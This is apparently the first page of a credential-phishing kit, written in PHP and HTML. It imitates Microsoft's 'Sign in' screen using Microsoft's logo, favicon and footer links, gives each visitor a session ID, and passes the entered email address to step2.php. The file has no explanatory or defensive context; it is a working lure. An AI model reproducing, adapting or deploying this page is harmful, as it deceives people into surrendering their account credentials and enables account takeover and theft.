<?php
session_start();
if(!isset($_SESSION['uid']) || empty($_SESSION['uid'])){
	$_SESSION['uid'] = gen();
}

if(isset($_GET['email']) && !empty($_GET['email'])){
	header('Location: ./step2.php');
}

function gen($len = 5){
	$abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
	$res = "";
	for ($i=0; $i < $len; $i++) { 
		$res .= $abc[rand(0,strlen($abc)-1)];
	}
	return $res;
}
?>
<html dir="ltr" class="" lang="uk"><head>
	<title>Signing in to your account</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="-1">

	<meta http-equiv="x-dns-prefetch-control" content="on">

	<link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
	<link rel="stylesheet" href="login_files/main.css">
	<meta name="robots" content="none">

</head>

<body style="display: block;overflow-y: hidden;">
	<div>
		
		<div>
			<div class="background" role="presentation">
				<div style="background-image: url(&quot;./login_files/bg_sm.jpg&quot;);"></div>
				<div class="backgroundImage" style="background-image: url(&quot;./login_files/bg_lg.jpg&quot;);"></div>
			</div>
		</div>
		<div></div>
		<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="get" target="_top" autocomplete="off" action="step2.php">
			<div class="outer">
				<div id="footer" class="footer default" role="contentinfo">
					<div>
						<div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" target="_blank" href="https://www.microsoft.com/uk/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" href="https://privacy.microsoft.com/uk/privacystatement" target="_blank">Privacy and cookies</a>
							<a id="moreOptions" href="#" role="button" class="moreOptions" aria-label="Клацніть тут, щоб переглянути інформацію про виправлення неполадок" aria-expanded="false">
								<img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" src="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
								<img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" src="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
							</a>
						</div>
					</div>
				</div><div class="middle">

					<div class="inner fade-in-lightbox">
						<div class="lightbox-cover"></div>
						<div> <img class="logo" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" src="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"> </div>
						<div role="main">
							<div class="">
								<div class="pagination-view animate has-identity-banner slide-in-next">
									<div data-viewid="1" data-showfedcredbutton="true">
										<div>
											<div class="row text-title" id="loginHeader">
												<div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
											</div>
										</div>
										<div class="row">
											<div class="form-group col-md-24">
												<div class="placeholderContainer">
													<div class="form-group">
														<input type="email" name="email" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Email or phone" aria-describedby="loginHeader" placeholder="Email or phone">
													</div>
													<div class="form-group">
														<a id="cantAccessAccount" name="cannotAccessAccount" href="#">Can't access your account</a>
													</div>
													<div class="form-group">
														<div class="form-group">
															<a id="idA_PWD_SwitchToCredPicker" href="#">Sign in with a secure key</a>
														</div>
													</div>
												</div>
											</div>
										</div>
										<div class="row">
											<div class="col-xs-24 no-padding-left-right button-container">
												<div class="inline-block">
													<input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Next">
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				
			</div>
		</form>
	</div>


</body></html>